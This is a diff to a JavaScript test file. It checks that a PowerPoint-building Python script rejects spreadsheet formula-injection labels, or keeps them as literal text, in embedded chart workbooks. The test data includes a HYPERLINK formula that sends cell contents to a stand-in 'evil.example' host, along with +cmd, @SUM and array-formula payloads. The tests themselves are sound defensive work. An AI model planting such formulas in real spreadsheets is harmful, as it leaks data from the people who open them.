@@ -120,13 +120,14 @@ const DECK = {
 };
 
 // Labels the chart workbook must keep as literal text: XlsxWriter's write() turns "=..." into a
-// formula and http(s)/ftp/mailto/internal/external strings into hyperlinks or external references.
-const HOSTILE_LABELS = ['=HYPERLINK("https://evil.example/?"&B2,"x")', "http://evil.example", "mailto:x@evil.example", "external:x", "+cmd", "-5% churn"];
+// formula, "{=...}" into an array formula even with strings_to_formulas off, and
+// http(s)/ftp/mailto/internal/external strings into hyperlinks or external references.
+const HOSTILE_LABELS = [
+  '=HYPERLINK("https://evil.example/?"&B2,"x")', '{=HYPERLINK("http://evil","x")}', "{=1+1}",
+  "http://evil.example", "mailto:x@evil.example", "external:x", "+cmd", "-cmd", "@SUM(1)", "\tx", "\rx",
+];
 
-// build_deck.py imports python-pptx at load time; stub it so the workbook options are checked
-// everywhere python3 exists, not only where python-pptx is installed.
-test("build_deck.py makes python-pptx write the chart workbook with formula and URL conversion off", { skip }, () => {
-  const out = py(`import json, sys, types
+const PPTX_STUB = `import sys, types
 class Any:
     def __init__(self, *a, **k): pass
     def __call__(self, *a, **k): return Any()
@@ -139,47 +140,90 @@ for name in ["pptx", "pptx.util", "pptx.enum", "pptx.enum.text", "pptx.dml", "pp
         parent, _, child = name.rpartition(".")
         setattr(sys.modules[parent], child, mod)
 sys.modules["pptx.util"].Emu = int
-seen = []
-sys.modules["pptx.chart.xlsx"].Workbook = lambda f, opts=None: seen.append(opts)
-import runpy
-runpy.run_path(sys.argv[1])
-sys.modules["pptx.chart.xlsx"].Workbook("blob", {"in_memory": True})
-print(json.dumps(seen))`, [DECK.muster]);
-  assert.deepEqual(JSON.parse(out), [{ in_memory: true, strings_to_formulas: false, strings_to_urls: false }]);
+`;
+
+// build_deck.py imports python-pptx at load time; stub it so validation and the workbook wrapper
+// are checked everywhere python3 exists, not only where python-pptx is installed.
+function deckValidate(script, labels) {
+  const spec = { slides: [{ layout: "claim_chart", title: "Growth", alt: "bar chart", chart: { type: "bar", categories: labels, series: [{ name: "Revenue", values: labels.map(() => 1) }] } }] };
+  return py(`${PPTX_STUB}
+import json, runpy
+m = runpy.run_path(sys.argv[1])
+try:
+    m["_validate"](json.loads(sys.argv[2]))
+    print("accepted")
+except ValueError as e:
+    print("rejected")`, [script, JSON.stringify(spec)]);
+}
+
+test("build_deck.py rejects chart labels with a formula or link trigger prefix", { skip }, () => {
+  for (const label of [...HOSTILE_LABELS, " =1+1", "HTTPS://evil.example", "ftp://x", "internal:Sheet2!A1"]) {
+    assert.equal(deckValidate(DECK.muster, [label, "Q2"]), "rejected", `${JSON.stringify(label)} must be rejected`);
+  }
+  for (const label of ["Q1", "Revenue (USD)", "Growth: 5%", "2024"]) assert.equal(deckValidate(DECK.muster, [label, "Q2"]), "accepted", label);
+  assert.equal(deckValidate(DECK.upstream, ['=HYPERLINK("https://evil.example/?"&B2,"x")', "Q2"]), "accepted", "kill check: upstream accepts a formula label");
 });
 
-// End to end with the real python-pptx/XlsxWriter when they are installed: build a deck, open the
-// chart's embedded workbook and count formulas and hyperlinks.
-// No -I here: python-pptx is often a user-site install. Running a script by path puts only the
-// script's own directory on sys.path, never the working directory.
+test("build_deck.py makes python-pptx write chart strings with write_string and conversion off", { skip }, () => {
+  const out = py(`${PPTX_STUB}
+import json, runpy
+calls = []
+class Sheet:
+    def write(self, *a): calls.append(["write", list(a)])
+    def write_string(self, *a): calls.append(["write_string", list(a)])
+class Book:
+    def __init__(self, f, opts=None): calls.append(["options", opts])
+    def add_worksheet(self, *a, **k): return Sheet()
+sys.modules["pptx.chart.xlsx"].Workbook = Book
+runpy.run_path(sys.argv[1])
+sheet = sys.modules["pptx.chart.xlsx"].Workbook("blob", {"in_memory": True}).add_worksheet()
+sheet.write(0, 0, "{=1+1}", None)
+sheet.write(1, 0, 3.5)
+print(json.dumps(calls))`, [DECK.muster]);
+  assert.deepEqual(JSON.parse(out), [
+    ["options", { in_memory: true, strings_to_formulas: false, strings_to_urls: false }],
+    ["write_string", [0, 0, "{=1+1}", null]],
+    ["write", [1, 0, 3.5]],
+  ]);
+});
+
+// End to end with the real python-pptx/XlsxWriter when they are installed: load build_deck.py (which
+// installs the workbook wrapper), let python-pptx write the chart workbook for every hostile label
+// (bypassing _validate, so the workbook layer is tested on its own), and read the sheet XML.
+// No -I here: python-pptx is often a user-site install; -c never puts the working directory first
+// when the code does not import from it, and cwd is a fresh directory.
 const hasPptx = !skip && spawnSync("python3", ["-B", "-c", "import pptx"]).status === 0;
-function deckWorkbook(script, labels) {
+function chartWorkbook(script, labels) {
   const dir = mkdtempSync(join(tmpdir(), "muster-deck-"));
   try {
-    const spec = { slides: [{ layout: "claim_chart", title: "Growth", alt: "bar chart", chart: { type: "bar", categories: labels, series: [{ name: "@SUM(1)", values: labels.map(() => 1) }] } }] };
-    writeFileSync(join(dir, "deck.json"), JSON.stringify(spec));
-    const build = spawnSync("python3", ["-B", script, join(dir, "deck.json"), join(dir, "out.pptx")], { encoding: "utf8", cwd: dir });
-    if (build.status !== 0) throw new Error(build.stderr);
-    return JSON.parse(py(`import io, json, re, sys, zipfile
-z = zipfile.ZipFile(sys.argv[1])
-x = zipfile.ZipFile(io.BytesIO(z.read(next(n for n in z.namelist() if n.endswith(".xlsx")))))
-sheet = x.read("xl/worksheets/sheet1.xml").decode()
+    const run = spawnSync("python3", ["-B", "-c", `import io, json, re, runpy, sys, zipfile
+runpy.run_path(sys.argv[1])
+from pptx.chart.data import CategoryChartData
+labels = json.loads(sys.argv[2])
+data = CategoryChartData(); data.categories = labels
+data.add_series(labels[0], [1] * len(labels))
+x = zipfile.ZipFile(io.BytesIO(data.xlsx_blob))
 names = x.namelist()
+sheet = x.read("xl/worksheets/sheet1.xml").decode()
 shared = x.read("xl/sharedStrings.xml").decode() if "xl/sharedStrings.xml" in names else ""
-print(json.dumps({"formulas": len(re.findall(r"<f>", sheet)), "hyperlinks": len(re.findall(r"<hyperlink\\b", sheet)),
-  "rels": [n for n in names if "worksheets/_rels" in n], "shared": shared}))`, [join(dir, "out.pptx")]));
+print(json.dumps({"formulas": re.findall(r"<f\\b[^>]*>[^<]*</f>", sheet), "hyperlinks": len(re.findall(r"<hyperlink\\b", sheet)),
+  "rels": [n for n in names if "worksheets/_rels" in n], "shared": shared}))`, script, JSON.stringify(labels)], { encoding: "utf8", cwd: dir });
+    if (run.status !== 0) throw new Error(run.stderr);
+    return JSON.parse(run.stdout.trim());
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
 }
 
-test("build_deck.py keeps =HYPERLINK, http, mailto, external and +cmd chart labels literal in the workbook", { skip: hasPptx ? false : "python-pptx not installed" }, () => {
-  const book = deckWorkbook(DECK.muster, HOSTILE_LABELS);
-  assert.equal(book.formulas, 0, "no label became a formula");
+test("build_deck.py's chart workbook holds no formula or hyperlink for any hostile label", { skip: hasPptx ? false : "python-pptx not installed" }, () => {
+  const book = chartWorkbook(DECK.muster, HOSTILE_LABELS);
+  assert.deepEqual(book.formulas, [], "no <f> formula element for any hostile label");
   assert.equal(book.hyperlinks, 0, "no label became a hyperlink");
   assert.deepEqual(book.rels, [], "no external relationship");
-  for (const label of ["HYPERLINK", "http://evil.example", "mailto:x@evil.example", "external:x", "+cmd", "@SUM(1)"]) assert.ok(book.shared.includes(label), `${label} is kept as a string`);
+  for (const label of ["HYPERLINK", "{=1+1}", "http://evil.example", "mailto:x@evil.example", "external:x", "+cmd", "@SUM(1)"]) {
+    assert.ok(book.shared.includes(label), `${label} is kept as a string`);
+  }
   // Kill check (external:x is left out: upstream's URL parser crashes on it).
-  const upstream = deckWorkbook(DECK.upstream, HOSTILE_LABELS.filter((l) => !l.startsWith("external:")));
-  assert.ok(upstream.formulas > 0 && upstream.hyperlinks > 0, "kill check: upstream writes a formula and hyperlinks");
+  const upstream = chartWorkbook(DECK.upstream, HOSTILE_LABELS.filter((l) => !l.startsWith("external:")));
+  assert.ok(upstream.formulas.length >= 3 && upstream.hyperlinks > 0, `kill check: upstream writes formulas and hyperlinks (${JSON.stringify(upstream.formulas)})`);
 });
